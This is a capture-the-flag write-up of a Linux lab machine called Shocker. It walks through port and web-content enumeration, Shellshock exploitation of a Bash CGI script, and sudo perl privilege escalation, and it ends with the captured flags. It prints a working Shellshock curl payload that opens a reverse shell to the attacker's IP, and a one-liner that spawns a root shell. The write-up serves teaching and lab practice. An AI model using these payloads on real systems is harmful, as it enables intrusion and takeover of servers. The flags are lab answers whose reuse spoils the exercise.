# Shocker (Easy · Linux)

**Author:** Ph4n3s
**Date:** 2026-10-20
**IP:** 10.129.78.142
**Difficulty:** Easy / Linux

---

## 1. Enumeration

### 1.1 Ping

First we run a `ping -c 5 10.129.78.142`, which returns the following:

```
64 bytes from 10.129.78.142: icmp_seq=1 ttl=63 time=53.7 ms
```

With a TTL of 63 we can guess it is a Linux machine.

### 1.2 Open port enumeration

We use the following command:

```
nmap -p- -open -T4 --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/ports
```

The output was:

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

We have an HTTP service on port 80, likely a website, and on 2222 a service identified as EtherNetIP (actually SSH running on a non-standard port, as we will see next).

### 1.3 Technology enumeration

To dig into the service versions we use:

```
nmap -p 80,2222 -sVC --min-rate 5000 -T4 10.129.78.142 -oN ~/HTB_machines/Shocker/targeted
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache 2.4.18 is a 2015/2016 release, and OpenSSH 7.2p2 is from 2016. Neither has a known direct RCE for this specific version, so we will focus on enumerating the web content before discarding anything.

Visiting `http://10.129.78.142` we find the following:

![Web page on port 80](01-pagina-web.png)

### 1.4 Vulnerability search with nmap scripts

```
nmap -p 80 --script vuln -Pn --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/vulns
```

```
PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|     Disclosure date: 2009-09-17
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

The only result is a possible Slowloris (DoS), which we discard: a denial of service does not give us access to the machine, and it is likely a false positive. A `searchsploit` on Apache 2.4.18 and OpenSSH 7.2p2 also returns nothing usable, so we move on to fuzzing the web content.

### 1.5 Fuzzing

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.78.142/cgi-bin/FUZZ -e .sh,.cgi,.pl -mc 200,403
```

Relevant result:

```
user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 67ms]
```

We find a shell script inside `/cgi-bin/`, which indicates the server runs CGI scripts in Bash — that is the way in.

---

## 2. Exploitation

Bash allows defining functions and storing them as environment variables so a child process can inherit them. If an environment variable starts with `() {`, Bash interprets it as a function definition — but in vulnerable versions, Bash does not stop there: it keeps reading and **executes** any command that comes after the `;`.

This is **Shellshock** (also called BashDoor), a 2014 vulnerability (CVE-2014-6271). Since the CGI server passes HTTP headers (such as `User-Agent`) into Bash environment variables before running the script, an attacker who controls that header controls what Bash executes.

With the following command we launch the reverse shell:

```
curl -s -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.120/4444 0>&1" http://10.129.78.142/cgi-bin/user.sh
```

With `nc -lvnp 4444` listening on our machine, we receive the shell as the user `shelly`.

### 2.1 Privilege escalation

Once inside, we check what we can run as root:

```
sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We look up `perl` on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) and run:

```
sudo perl -e 'exec "/bin/sh"'
```

With that we get a shell as root.

We navigate to `/root` and `cat` `root.txt`. Then to `/home/shelly` and `cat` `shelly.txt`.

---

## Quick summary

**What the machine was:** an Apache web server exposing a CGI script in Bash, vulnerable to Shellshock (CVE-2014-6271).

**Enumeration:** `nmap` → ports 80 (HTTP) and 2222 (SSH) → versions with no direct RCE → fuzzing with `ffuf` on `/cgi-bin/` → `user.sh` is discovered.

**Exploitation:** the CGI passes the `User-Agent` header into the Bash environment. A vulnerable version of Bash executes any command placed after `() { :; };` in that variable → `curl` with malicious payload → reverse shell as `shelly`.

**Privilege escalation:** `sudo -l` → `shelly` can run `/usr/bin/perl` as root without a password → `sudo perl -e 'exec "/bin/sh"'` (GTFOBins) → shell as root.

**Key concept learned:** Shellshock is not a code injection in the classic sense; it is a flaw in Bash's *parser* that confuses the end of a function definition with the end of an environment variable, executing everything that comes after it as commands.

---

**Flags:**
- `shelly.txt` → `fde40593b667845862b8984fa0ad854e`
- `root.txt` → `bc4b64775928762be10c699859222e4d`
